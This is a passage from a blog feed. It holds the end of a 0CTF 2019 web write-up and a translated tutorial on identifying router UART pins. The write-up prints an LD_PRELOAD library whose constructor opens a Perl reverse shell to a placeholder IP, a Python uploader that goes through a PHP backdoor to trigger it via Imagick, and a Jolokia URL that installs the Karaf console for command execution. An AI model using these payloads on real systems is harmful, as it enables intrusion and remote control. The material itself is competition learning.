</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>); </span><br><span class="line">    system(<span class="string">"ls"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个东西会在共享库装载的时候触发执行，这样一来只要有额外的外部程序执行就可以利用。我们就得到一种更通用的劫持执行的方法。</p><h3 id="解决外部程序调用"><a href="#解决外部程序调用" class="headerlink" title="解决外部程序调用"></a>解决外部程序调用</h3><p>可惜的是题目禁用了<code>mail</code>，看来只能另辟蹊径了。结合题目给的hint，看来是要使用<code>imagick</code>作为突破了。查看php-imagick源码</p><p><a href="https://github.com/ImageMagick/ImageMagick" target="_blank" rel="noopener">https://github.com/ImageMagick/ImageMagick</a></p><p>从这个网站 <a href="https://imagemagick.org/script/formats.php" target="_blank" rel="noopener">https://imagemagick.org/script/formats.php</a> 中可以看到各种格式的文件会调用不同的程序，所以构造一个能够调用额外程序的相应的文件即可。同时可以使用<code>strace -f php xxx.php 2&gt;&amp;1 | grep execve</code> 来验证程序有外部调用。</p><p>这里选择了调用<code>ghostscript</code>的eps文件。注意：必须要有相关文件的文件头才行。这里打算通过反弹shell来执行readflag的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __attribute__((__constructor__)) init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line"> system(<span class="string">"perl -e 'use Socket;$i=\"your_IP\";$p=your_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;'"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译成共享库 <code>gcc -shared -fPIC evil.c -o evil.so</code>，如果是要编译成32位的加上<code>-m32</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">token = <span class="string">"/tmp/f28c9b5f67a7b7651a9d2b0021affc4e/"</span></span><br><span class="line">host = <span class="string">"http://111.186.63.208:31340"</span></span><br><span class="line">base = <span class="string">"your_vps"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_backdoor</span><span class="params">(payload)</span>:</span></span><br><span class="line">        res = requests.post(host, data=&#123;<span class="string">"backdoor"</span>:payload&#125;)</span><br><span class="line">        <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">        tp = token + filename</span><br><span class="line">        rp = base + filename</span><br><span class="line">        p = <span class="string">'echo file_put_contents("'</span> + tp + <span class="string">'", file_get_contents("'</span> + rp + <span class="string">'"));'</span></span><br><span class="line">        <span class="keyword">return</span> send_backdoor(p)</span><br><span class="line"></span><br><span class="line">print(up_file(<span class="string">"evil.so"</span>))</span><br><span class="line">print(up_file(<span class="string">"bypass.eps"</span>))</span><br><span class="line"></span><br><span class="line">print(send_backdoor(<span class="string">"putenv('LD_PRELOAD="</span> + token + <span class="string">"evil.so"</span> + <span class="string">"');"</span> + <span class="string">"$img = new Imagick('"</span> + token + <span class="string">"bypass.eps"</span> + <span class="string">"');"</span>))</span><br></pre></td></tr></table></figure><p>在vps上监听，随后执行脚本，可以看到上传成功的话里面会有上传文件的大小混在网页html中。</p><img src="/2019/03/31/2019TCTF-web-writeup/3.png"><p>最后在根目录下拿到flag。</p><h3 id="题目之外"><a href="#题目之外" class="headerlink" title="题目之外"></a>题目之外</h3><p>其实我们可以走的更远，这里只是劫持了库函数执行我们的恶意代码，但是也可以在执行完恶意代码后再执行正常的库函数，这样以假乱真，效果更棒:)</p><h2 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h2><p>打开题目看到有一个basic认证，其实这里是可以爆破的，得到密码<code>karaf:karaf</code>，当然我是事后才知道的，看writeup有的人是根据 <a href="https://karaf.apache.org/manual/latest/webconsole" target="_blank" rel="noopener">https://karaf.apache.org/manual/latest/webconsole</a> ，也有的人是根据jetty的默认凭证。</p><p>成功认证之后是得到一个404的页面，这里根据<code>Ghost Pepper</code>猜到<code>jolokia</code>路径，这里有点脑洞了，这种路径爆破也出不来。。。在拿到路径之后发现是一个OSGI的api接口。</p><p>对于java不是很熟悉，照着writeup一路走，这里用到了<code>jolokia/list</code>来列举能用的类，返回的json数据美化一下看着更加方便。里面比较有用的就是<code>org.apache.karaf</code>，能够安装和执行一些jar包，这对我们来说用处很大，只要构造恶意的jar包反弹shell，就能拿到flag了。然而，我垃圾的java功底完全构造不出来。。。</p><p>这里采用的另外一个思路，Karaf有一个webconsole，我们可以通过installFeature来安装一个webconsole。</p><p><code>http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole</code></p><p>安装之后，访问<code>http://111.186.63.207:31337/system/console/gogo</code></p><img src="/2019/03/31/2019TCTF-web-writeup/4.png"><p>直接可以执行命令，拿到flag</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://www.linuxidc.com/Linux/2017-12/149841.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2017-12/149841.htm</a></p><p><a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md" target="_blank" rel="noopener">https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md</a></p><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper</a></p><p><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a></p><p><a href="https://fireshellsecurity.team/0ctf-ghost-pepper/" target="_blank" rel="noopener">https://fireshellsecurity.team/0ctf-ghost-pepper/</a></p><p><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a></p><p><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy</a></p><p><a href="https://www.anquanke.com/post/id/103016" target="_blank" rel="noopener">https://www.anquanke.com/post/id/103016</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;wallbreaker-easy&quot;&gt;&lt;a href=&quot;#wallbreaker-easy&quot; class=&quot;headerlink&quot; title=&quot;wallbreaker easy&quot;&gt;&lt;/a&gt;wallbreaker easy&lt;/h2&gt;&lt;p&gt;这道题在比赛的时候专注在im
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
      <category term="JAVA" scheme="https://hurricane618.me/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>快速寻找串行接口</title>
    <link href="https://hurricane618.me/2019/03/02/serial-ports-translation-cn/"/>
    <id>https://hurricane618.me/2019/03/02/serial-ports-translation-cn/</id>
    <published>2019-03-02T11:31:43.000Z</published>
    <updated>2019-03-03T12:57:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇来自devttys0的一篇文章，在寻找串口的方法上给出了很多有用的方法，是一篇不错的总结文，在国内没有看到翻译，所以就想翻译成中文供大家学习，第一次做翻译，如有错误之处，请大家体谅，可以给我留言，我会快速修改。</p><p><a href="http://www.devttys0.com/2012/11/reverse-engineering-serial-ports/" target="_blank" rel="noopener">原文链接</a></p><p>鉴于这个博客的名声和我拥有的点击量，我认为现在是大家一起讨论串口的时候了，尤其是嵌入式系统的串口。</p><p>我的目标是通过使用确定的测试和有根据的猜测来讲解我发现的有效识别和逆向嵌入式串口的技术，而不需要特别昂贵的设备。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>串口对于嵌入式开发人员特别有用，通常会使用串口来：</p><ul><li>进入boot loader</li><li>得到启动和调试信息</li><li>通过shell和系统交互</li></ul><p>不用说这个功能同样对黑客有用，所以在嵌入式设备上找到一个串口会非常有用。作为一个学习案例，我们将测试Westell 9100EM FiOS 路由器的PCB，用于寻找可能的串口。</p><img src="/2019/03/02/serial-ports-translation-cn/1.jpg" title="Westell 9100EM PCB"><p>现在，不是你们父亲那一代寻找的RS-232串口，现在有通用异步收发器，Universal Asynchronous Receiver Transmitters (UARTs)，常见于嵌入式设备中。虽然协议兼容，RS-232和UART不是电压兼容（从这里开始我会把UART和串口互换）。UARTs常用在3.3V，但是也有可能用在其他其他标准电压上。（5V、1.8V等）</p><p>不幸的是，这里没有任何工业标准的UART引脚输出，并且制造商通常不会宣传或记录他们的调试接口。所以为了连接这些串口，我们需要做一些工作。尤其，我们需要逆向工程硬件接口和软件协议设置。</p><p>让我们先从硬件接口开始，为此，你需要一个万用表和一对眼球（甚至一个也可以做的很好，23333）。是的，示波器和逻辑分析仪很有用，有时也是必要的，但是在99%的时间里，一个可靠的万用表和一点点知识就是你需要的全部。</p><h2 id="识别串口头"><a href="#识别串口头" class="headerlink" title="识别串口头"></a>识别串口头</h2><p>第一步是尝试识别串口标头的潜在对象。大部分的串口头至少有四个引脚：</p><ul><li>Vcc</li><li>Ground</li><li>Transmit</li><li>Receive</li></ul><p>通常情况下，你将要寻找单排4-6个引脚的地方，虽然这不是一个严格的规定，它们可以采用制造商决定的任何引脚配置。</p><p>在我们的 9100EM PCB ，能找到两个可能的地方 P1402 和 P1404标签处：</p><img src="/2019/03/02/serial-ports-translation-cn/2.jpg" title="可能的串口头"><p>有时，你不会有这样一套很好的引脚，你必须要检查板子上的监测点，通常从最接近SoC的测试点开始是一个好主意。这里有一个WL530G的例子，通过板子上的不同测试点来发现串口。</p><img src="/2019/03/02/serial-ports-translation-cn/3.jpeg" title="WL530G的串口测试点"><p>在任何一种情况下，识别引脚的过程都是相同的。但是如果没有头部通常会需要更长的时间，因为可能会超过4个检测点需要去检查。</p><p>此时，P1402或P1404可能是串口头，或者它们都是串口头，又或者两者都不是串口头。 因此，我们将分别检查每个头部上的引脚，尝试去获得一些有用信息。</p><h2 id="肉眼观察"><a href="#肉眼观察" class="headerlink" title="肉眼观察"></a>肉眼观察</h2><p>首先，让我们仔细检查引脚，从P1402开始：</p><img src="/2019/03/02/serial-ports-translation-cn/4.png" title="P1402正面"><img src="/2019/03/02/serial-ports-translation-cn/5.png" title="P1402背面"><p>在PCB的正面最右侧的引脚被标记为1，这不是非常重要，但是在描述引脚编号的时候它给出了一个共同的参考框架。</p><p>在PCB的背面，我们看到引脚3有四条痕迹组成十字图案，它们连接在地线平面的附近。这很容易的将引脚3识别为地线（Ground）。</p><p>引脚2和4有细的痕迹连接到它们，而引脚1连接在较粗的痕迹上。宽的痕迹通常用于供电的，而窄的痕迹通常用于信号传输。这表明引脚1是Vcc，引脚2和4可能是收发（尽管我们不知道哪个是哪个）。</p><p>让我们看看P1404的头部：</p><img src="/2019/03/02/serial-ports-translation-cn/6.png" title="P1404正面"><img src="/2019/03/02/serial-ports-translation-cn/7.png" title="P1404背面"><p>这里，最左边的引脚被标记为1。再一次，我们看到引脚3连接在PCB背面接地。引脚4也有一个连接到它的细痕迹，所以它可能是传输或者接受引脚。</p><p>然而，P1404的另外两个引脚在PCB的正面或背面上没有连接到它们的可见痕迹。可能是它们没有连接到任何东西，但是更可能的是它们的痕迹连接在我们看不到的PCB中一个内层上。是时候使用万用表了。</p><h2 id="识别接地引脚"><a href="#识别接地引脚" class="headerlink" title="识别接地引脚"></a>识别接地引脚</h2><p>连续性测试将小电流引入电路，如果有足够的电流从一个探针到另外一个探针（即电阻足够小），万用表将会发出可听见的音调，表明探针所接触的点是电连接的。[译者注：其实这里我们直接用万用表的蜂鸣档，也就是通断档位，也是这个效果]</p><p>我们要做的第一件事情是使用万用表在接地和每个头部上的所有引脚之间进行连续性测试。这会告诉我们哪些引脚直接连接到地线。我们会从P1402开始。</p><p>金属屏蔽是用于测试的便利接地点。将一个探针放在屏蔽上并将另外一个探针接触到引脚3，万用表会发出连续的可听音调，表示我们之前观察到引脚3是接地的。</p><img src="/2019/03/02/serial-ports-translation-cn/8.jpg" title="引脚3的接地测试"><p>对引脚2和4执行相同的测试会没有声音，所以我们知道这些引脚没有接地。</p><p>对P1404的引脚2,3,4 做相同连续性测试也会产生相同的结果。因此，我们知道了对于P1402和P1404，引脚3是接地的，引脚2和4不接地。</p><h2 id="识别Vcc"><a href="#识别Vcc" class="headerlink" title="识别Vcc"></a>识别Vcc</h2><p>Vcc不太重要，因为我们实际上不需要连接任何东西到Vcc，但是定位Vcc引脚是一个很好的练习，并且有助于消除Vcc引脚作为收发的可能。</p><p>基于痕迹的宽度，我们怀疑引脚1是Vcc，当电路板通电时，测量引脚1上的电压似乎证实了这一点：</p><img src="/2019/03/02/serial-ports-translation-cn/9.jpg" title="测试引脚1的电压"><img src="/2019/03/02/serial-ports-translation-cn/10.jpg" title="在P1402上测出的稳定电压"><p>在P1404的引脚1上也读出相同的电压，这表明P1402和P1404都将引脚1连接到Vcc。</p><p>识别Vcc的另外一种方法是在地线和可疑Vcc引脚之间执行连续性测试。虽然它可能会有点反直觉，但是通常这会导致非常短的嘟嘟声（尽管不是连续音调）。</p><p>Vcc的连续性测试表明在Vcc引脚和地线之间通常连接着一个滤波电容。这样做时为了消除PCB上电源线中的任何可能的噪声，并且这种滤波电容器可以在任何设计良好的电路板中使用。由于电容器的工作性质，它们将非常短暂地“通过”直流电，直到它们被充电到容量，此时它们将停止“通过”直流电并将“阻断”直流电流，从而在连续性测试中观察到导致短暂的蜂鸣声（值得一提的是，电流实际上并没有通过电容器，尽管它看着像是这样的）。</p><p>虽然它并不总是有效，但是连续性测试是比简单测试每个引脚上的电压更准确的方法。因为任意数量的引脚可能是相同的电压。请注意，你还需要一个高灵敏的万用表来进行连续性测试，为了保证测试的正确性。更便宜的产品在触发之前可能需要一秒或更长的时间，此时电容器已经充电。大多100美元范围内的万用表应该是足够了。</p><h2 id="识别传输引脚"><a href="#识别传输引脚" class="headerlink" title="识别传输引脚"></a>识别传输引脚</h2><p>只要串口处于激活状态并且正在传输数据，传输引脚和农容易识别（如果不是，那么整个工作可能无论如何都是徒劳的）。电路板上的传输引脚将被拉高到和Vcc相同的电压（通常为3.3V）。当它传输数据位的时候，电压将下降到0V（发送空格），然后回到3.3V（发送标记）。当读取变化的直流电压时，数字万用表将最终显示采样电压的平均值，这意味着平均电压（万用表显示的）将在突发激活期间短暂下降。</p><p>传输引脚上的大多数活动通常发生在系统启动期间，当从bootloader、内核、系统的所有引导信息打印到串口时。通过在引导期间监控引脚2和4，我们应该可以轻松地识别哪个是传输引脚。让我们先看看P1402：</p><img src="/2019/03/02/serial-ports-translation-cn/11.jpg" title="P1402引脚2的电压测量"><img src="/2019/03/02/serial-ports-translation-cn/12.jpg" title="P1402引脚4的电压测量"><p>P1402引脚2和4的电压都是稳定无波动的3.3V。</p><img src="/2019/03/02/serial-ports-translation-cn/13.jpg" title="P1402引脚2和4的电压"><p>这可不太好，所以让我们看看P1404头部，将从引脚2开始：</p><img src="/2019/03/02/serial-ports-translation-cn/14.jpg" title="P1404引脚2的电压测试"><p>引脚2的电压数值在最初的几秒徘徊在40mV，然后它稳定在2.3V：</p><img src="/2019/03/02/serial-ports-translation-cn/15.jpg" title="P1404引脚2的初始电压"><img src="/2019/03/02/serial-ports-translation-cn/16.jpg" title="P1404引脚2的最终电压"><p>让我们看看引脚4：</p><img src="/2019/03/02/serial-ports-translation-cn/17.jpg" title="P1404引脚4的电压测试"><p>引脚4的电压数值在最初几秒稳定在3.3V：</p><img src="/2019/03/02/serial-ports-translation-cn/18.jpg" title="P1404引脚4的初始电压"><p>然后突然我们开始看到引脚4的电压数值快速并实质的变化：</p><img src="/2019/03/02/serial-ports-translation-cn/19.jpg" title="P1404引脚4的电压下降到2.4V"><img src="/2019/03/02/serial-ports-translation-cn/20.jpg" title="P1404引脚4的电压回升到3.2V"><img src="/2019/03/02/serial-ports-translation-cn/21.jpg" title="P1404引脚4的电压下降到2.3V"><p>P1404的引脚4存在一些活动，表明它实际上是一个有效数据引脚，很有可能是串口的传输引脚。</p><p>虽然这是识别传输引脚的有效方法，但是需要注意的是，如果串口仅仅传输少量数据，电压波动对于万用表来说太过短暂，你就要使用示波器或逻辑分析仪来捕获传输引脚上上的数据活动。然而这是很少见的，通常串口上都会有大量数据传输来让这个方法起作用。</p><h2 id="识别接受引脚"><a href="#识别接受引脚" class="headerlink" title="识别接受引脚"></a>识别接受引脚</h2><p>明确识别接受引脚是最困难的，因为它没有独特的定义特征。我观察过各种系统的接受引脚的各种电压，包括：</p><ul><li>拉高到和Vcc相同的电压</li><li>拉高到比Vcc低几百mV的电压</li><li>左漂浮，在几百mV左右剧烈波动</li><li>左漂浮几秒，然后在串口初始化时被拉高</li></ul><p>由于我们在两个头部上只剩下一个未知引脚，我们知道只有P1404有效，通过排除法我们可以假设P1404上的引脚4是接受引脚。但是，有时可以将串行适配器单独连接到所有可能的接受引脚，运行minicom（Linux下的串口连接程序）按键盘的几个键，看看会发生什么。说到连接我们的串行适配器，让我们这样做。</p><h2 id="连接UART适配器"><a href="#连接UART适配器" class="headerlink" title="连接UART适配器"></a>连接UART适配器</h2><p>便宜的USB-UART适配器很容易获得，并且在Linux上默认支持，它们只是作为标准的USB串口，可以和minicom、python等一起使用。我们需要将UART适配器连接到串口，方式如下：</p><ul><li>适配器的地线必须连接到串口的地线</li><li>适配器的传输引脚必须连接到串口的接受引脚</li><li>适配器的接受引脚必须连接到串口的传输引脚</li></ul><p>实现这个的最简单方法是将<a href="http://www.digikey.com/product-detail/en/4-103327-0/A26514-40-ND/297924" target="_blank" rel="noopener">分离头</a>按大小焊接在P1404：</p><img src="/2019/03/02/serial-ports-translation-cn/22.jpg" title="分离头固定在面板上"><p>并使用一些<a href="https://www.sparkfun.com/products/9140" target="_blank" rel="noopener">公对母跳线</a>连接串口和适配器之间的相应引脚：</p><img src="/2019/03/02/serial-ports-translation-cn/23.jpg" title="UART适配器连接P1404"><h2 id="发现波特率"><a href="#发现波特率" class="headerlink" title="发现波特率"></a>发现波特率</h2><p>有了我们的硬件，就可以开始检查串口协议设置了。串口可以有多种设置，我们需要知道所有设置才能和串口通信：</p><ul><li>什么是波特率？</li><li>使用了多少数据位？</li><li>使用了多少奇偶校验位？</li><li>使用了多少停止位？</li></ul><p>幸运的是，事实上的标准是使用8个数据位，没有奇偶校验位和1个停止位（缩写成8N1），所以只留下波特率是未知的。试错法是识别波特率的最快、最简单的方法。由于串口通常用于显示调试信息（即传输ASCII数据），并且只有少量可能的波特率，因此切换所有可能的波特率直到观察到可以理解的数据是切实可行的。</p><p>或者，至少这是理论上的工作方式。实际上，如果支持这样做的话，我使用的所有终端仿真程序都会使得动态更改波特率变得很麻烦。为了去解决这个问题，我写了一个名为baudrate的工具，它试图自动检测激活的传输串口波特率（如果你愿意，你也可以手动循环每个波特率）。完成后，它会保存一个与minicom兼容的配置文件，并能用你的minicom加载。</p><p>随着UART适配器的连接，让我们运行baudrate（我使用手动模式演示，但自动检测功能在一样有魅力）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eve@eve:~$ sudo ./baudrate.py -p /dev/ttyUSB0</span><br><span class="line"></span><br><span class="line">Starting baudrate detection on /dev/ttyUSB0, turn on your serial device now.</span><br><span class="line">Press Ctl+C to quit.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 115200 @@@@@@@@@@@@@@@@@@@@@</span><br></pre></td></tr></table></figure><p>我们能改变波特率通过按上/下箭头将波特率改为下一个更高/更低的波特率：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 115200 @@@@@@@@@@@@@@@@@@@@@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 57600 @@@@@@@@@@@@@@@@@@@@@    &lt;--- Down arrow decreases baud rate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 115200 @@@@@@@@@@@@@@@@@@@@@    &lt;--- Up arrow increases baud rate</span><br></pre></td></tr></table></figure><p>好的，现在让我们打开 9100EM 然后看看会发生什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 115200 @@@@@@@@@@@@@@@@@@@@@</span><br><span class="line"></span><br><span class="line">Starting entry for CP1 @0xa3400000</span><br><span class="line">memsize=52</span><br><span class="line">CPU revision is: 00019641</span><br><span class="line">Primary instruction cache 16kB, physically tagged, 4-way, linesize 32 bytes.</span><br><span class="line">Primary data cache 16kB 4-way, linesize 32 bytes.</span><br><span class="line">Linux version 2.4.21openrg-rmk1 #2 Thu Aug 28 19:30:48 CDT 2008</span><br><span class="line">Determined physical RAM map:</span><br><span class="line">User-defined physical RAM map:</span><br><span class="line"> memory: 03400000 @ 00000000 (usable)</span><br><span class="line">On node 0 totalpages: 13312</span><br><span class="line">zone(0): 4096 pages.</span><br><span class="line">zone(1): 9216 pages.</span><br><span class="line">zone(2): 0 pages.</span><br><span class="line">Kernel command line:  mem=52M</span><br><span class="line">mips_counter_frequency:166666667</span><br><span class="line">r4k_offset: 00196e6a(1666666)</span><br><span class="line">Calibrating delay loop... 222.00 BogoMIPS</span><br><span class="line">Memory: 44356k/53248k available (1568k kernel code, 8892k reserved, 6696k data, 4k init, 0k highmem)</span><br><span class="line">Dentry cache hash table entries: 8192 (order: 4, 65536 bytes)</span><br><span class="line">Inode cache hash table entries: 4096 (order: 3, 32768 bytes)</span><br><span class="line">Mount cache hash table entries: 512 (order: 0, 4096 bytes)</span><br><span class="line">Buffer-cache hash table entries: 1024 (order: 0, 4096 bytes)</span><br><span class="line">Page-cache hash table entries: 16384 (order: 4, 65536 bytes)</span><br><span class="line">Checking for &apos;wait&apos; instruction...  unavailable.</span><br><span class="line">POSIX conformance testing by UNIFIX</span><br><span class="line">PCI: Probing PCI hardware on host bus 0.</span><br><span class="line">Autoconfig PCI channel 0x801d19e0</span><br><span class="line">Scanning bus 00, I/O 0x1ae00000:0x1b000001, Mem 0x18000000:0x1a000001</span><br><span class="line">00:0e.0 Class 0200: 168c:001a (rev 01)</span><br><span class="line">        Mem at 0x18000000 [size=0x10000]</span><br><span class="line">Linux NET4.0 for Linux 2.4</span><br><span class="line">Based upon Swansea University Computer Society NET3.039</span><br><span class="line">Initializing RT netlink socket</span><br><span class="line">Starting kswapd</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>看起来我们尝试的第一个波特率115200是正确的（这并不奇怪，因为115200是实践中最常见的波特率之一）。按Ctl + C我们可以停止捕获并将设置保存到minicom配置文件，在这种情况下我将其命名为’9100em’：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Detected baudrate: 115200</span><br><span class="line"></span><br><span class="line">Save minicom configuration as: 9100em</span><br><span class="line"> </span><br><span class="line">Configuration saved. Run minicom now [n/Y]? n</span><br><span class="line"></span><br><span class="line">eve@eve:~$</span><br></pre></td></tr></table></figure><h2 id="进入shell"><a href="#进入shell" class="headerlink" title="进入shell"></a>进入shell</h2><p>现在我们运行minicom：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eve@eve:~$ minicom 9100em</span><br></pre></td></tr></table></figure><p>然后看看我们得到了什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">12/31 19:00:57 - Starting SoC reset sequence...</span><br><span class="line">12/31 19:00:58 - Clink FS shared data area written</span><br><span class="line">12/31 19:00:58 - CLNK_ETH_CTRL_RESET returned status 0 after 0.914 seconds</span><br><span class="line">12/31 19:00:58 - FSUPDATE: Pass = 1, Tuned Freq = 1000 MHz (8)</span><br><span class="line">12/31 19:01:10 - Clink Reset Cause :0x4 Reg:0x80240100 Dbg:0x0</span><br><span class="line">12/31 19:01:10 - Starting SoC reset sequence...</span><br><span class="line">12/31 19:01:11 - Clink FS shared data area written</span><br><span class="line">12/31 19:01:11 - CLNK_ETH_CTRL_RESET returned status 0 after 0.903 seconds</span><br><span class="line">12/31 19:01:12 - FSUPDATE: Pass = 1, Tuned Freq = 1150 MHz (14)</span><br><span class="line"></span><br><span class="line">Username: admin</span><br><span class="line">Password: *********</span><br><span 